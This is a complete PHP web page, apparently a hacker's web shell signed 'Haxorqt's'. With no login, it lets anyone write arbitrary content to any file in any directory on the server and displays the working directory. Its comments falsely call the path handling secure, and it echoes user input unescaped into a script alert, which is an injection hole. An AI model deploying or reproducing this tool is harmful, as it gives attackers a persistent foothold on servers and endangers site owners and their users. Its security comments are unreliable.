<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Allow the user to input a directory
    $selectedDirectory = realpath($_POST['directory']); // Secure and normalize the path
    $filename = basename($_POST['filename']); // Secure filename
    $content = $_POST['content'];

    // Ensure the directory exists, if not, create it
    if (!is_dir($selectedDirectory)) {
        mkdir($selectedDirectory, 0755, true);
    }

    // Construct the full file path
    $filepath = $selectedDirectory . '/' . $filename;

    // Attempt to create and write to the file
    if (file_put_contents($filepath, $content) !== false) {
        echo "<script>alert('File \"$filename\" created successfully in \"$selectedDirectory\"');</script>";
    } else {
        echo "<script>alert('Failed to create the file.');</script>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flexible File Creator</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; padding: 20px; }
        input, textarea, button { display: block; margin: 10px 0; width: 100%; padding: 8px; }
        button { background-color: #286ea7; color: white; border: none; cursor: pointer; }
        button:hover { background-color: #218838; }
    </style>
</head>
<body>

    <h2>Flexible File Creator | Haxorqt's</h2>
    <p>Current Working Directory: <strong><?php echo getcwd(); ?></strong></p>

    <form method="POST" action="">
        <label for="directory">Target Directory:</label>
        <input type="text" name="directory" id="directory" value="<?php echo getcwd(); ?>" required>

        <label for="filename">File Name:</label>
        <input type="text" name="filename" id="filename" required>

        <label for="content">Content:</label>
        <textarea name="content" id="content" required></textarea>

        <button type="submit">Create File</button>
    </form>

</body>
</html>
